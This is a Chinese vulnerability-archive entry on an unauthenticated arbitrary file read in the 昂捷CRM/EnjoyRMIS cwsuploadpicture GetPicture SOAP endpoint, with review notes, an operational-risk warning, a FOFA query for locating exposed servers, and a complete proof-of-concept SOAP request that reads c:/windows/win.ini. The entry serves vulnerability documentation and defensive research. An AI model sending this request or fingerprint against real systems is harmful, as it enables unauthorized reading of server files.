---
source: "wy876 漏洞文库"
title: "昂捷CRM/EnjoyRMIS组件 cwsuploadpicture GetPicture读取"
product: "昂捷CRM/EnjoyRMIS组件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows绝对路径，版本未知"
prerequisites: "无凭据示例"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/kyistvq4bcnt1rdb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%98%82%E6%8D%B7CRM/%E6%98%82%E6%8D%B7CRMcwsuploadpicture%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/ClientBin/slEnjoy.App.xap\""
fofa_unverified: "body="
id: "vw-399e19e813008b9ef2ead5cd"
entity_id: "ve-399e19e813008b9ef2ead5cd"
schema_version: "1"
---

# 昂捷CRM/EnjoyRMIS组件 cwsuploadpicture GetPicture读取

## 条目说明

- 对象与具体问题：昂捷CRM/EnjoyRMIS组件；cwsuploadpicture GetPicture读取
- 版本、配置及部署条件：Windows绝对路径，版本未知
- 认证与权限前提：无凭据示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 实际GetPicture读取功能，不能因文件名upload就错归上传；与402分块下载独立方法
- 未给SOAP返回/Base64解码样例、文件访问边界和补丁
- EnjoyRMIS大小写路径在不同托管系统兼容性需注明，不按字符串大小写造新实体

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
昂捷CRM (Customer Relationship Management) 是深圳市昂捷信息技术股份有限公司提供的一款专注于零售行业客户关系管理的系统。旨在帮助零售企业更好地管理客户、提升客户满意度和忠诚度，从而推动业务增长，该系统集成了客户信息管理、会员营销、客户服务等多个功能模块，为零售企业提供全方位的客户关系管理解决方案。昂捷CRM cwsuploadpicture存在任意文件读取漏洞

## 二、影响版本
```plain
昂捷CRM 
```

## 三、资产测绘
+ fofa`body="/ClientBin/slEnjoy.App.xap"`
+ 特征


## 四、漏洞复现
```http
POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetPicture"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetPicture xmlns="http://tempuri.org/">
      <sFullFileName>c:/windows/win.ini</sFullFileName>
    </GetPicture>
  </soap:Body>
</soap:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kyistvq4bcnt1rdb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
